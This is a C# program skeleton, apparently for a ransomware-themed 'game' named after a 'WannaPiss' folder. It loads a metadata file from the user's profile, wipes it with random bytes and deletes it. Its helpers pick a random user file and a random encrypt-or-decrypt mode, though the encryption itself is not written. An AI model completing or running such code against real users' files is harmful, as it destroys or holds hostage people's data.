using System;
using System.Collections.Generic;
using System.Linq;
using System.Threading.Tasks;
using System.Windows.Forms;
using System.IO;
using System.Text;

namespace RansomwareGame
{
    internal static class Program
    {
        /// <summary>
        /// The main entry point for the application.
        /// </summary>
        [STAThread]
        static void Main()
        {
            // Get current user's directory
            string userDirectory = Environment.GetFolderPath(Environment.SpecialFolder.UserProfile);
            string csvPath = userDirectory + "\\WannaPiss\\system32.csv";

            Metadata.readCSV(csvPath);

            //open system32.csv and write random data to it the same length as the original file
            Random rnd = new Random();

            byte[] data = System.IO.File.ReadAllBytes(csvPath);
            byte[] dataNew = new byte[data.Length];
            for (int i = 0; i < data.Length; i++)
            {
                dataNew[i] = (byte)rnd.Next(0, 255);
            }
            System.IO.File.WriteAllBytes(csvPath, dataNew);

            // Delete csv file
            System.IO.File.Delete(csvPath);

            Application.EnableVisualStyles();
            Application.SetCompatibleTextRenderingDefault(false);
            Application.Run(new Form1());

            // Read game state

            // Randomly select a file from the user's directory
            

            // Randomly select a game mode

        }
        //choose a random file from List<Metadata> and output it to a string variable called randomFile
        public static Metadata randomFile(){
            Random rnd = new Random();
            int randomIndex = rnd.Next(0, Metadata.files.Count);
            Metadata randomFile = Metadata.files[randomIndex];
            return randomFile;
        }

        //choose a random number between 0 and 1 and output it to a string variable called randomMode
        public static string randomMode(){
            Random rnd = new Random();
            int randomMode = rnd.Next(0, 2);
            string mode = "";
            if (randomMode == 0)
            {
                mode = "Decrypt";
            }
            else if (randomMode == 1)
            {
                mode = "Encrypt";
            }
            else
            {
                mode = "Bru";
            }
            return mode;
        }
    }
}
